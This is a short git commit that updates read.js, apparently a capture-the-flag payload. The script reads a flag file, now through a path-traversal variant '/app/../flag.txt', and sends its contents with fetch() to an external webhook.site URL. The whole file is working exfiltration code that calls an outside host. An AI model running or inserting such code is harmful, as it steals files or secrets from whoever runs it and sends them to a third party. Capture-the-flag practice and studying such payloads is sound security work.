0cc0d487c843b67aa16c39985b1ab3b6a29372bc
Abdul Wassay <57496383+hotplugin0x01@users.noreply.github.com>
2024-12-14 10:47:52 +0500

    Update read.js

--- read.js
+++ read.js
@@ -1,4 +1,4 @@
-require('fs').readFile('/flag.txt', (err, data) => {
+require('fs').readFile('/app/../flag.txt', (err, data) => {
   if (!err) {
     fetch('https://webhook.site/ff07d904-39d0-4e1e-94ef-ca7e055d5538?flag=' + encodeURIComponent(data.toString()));
   }
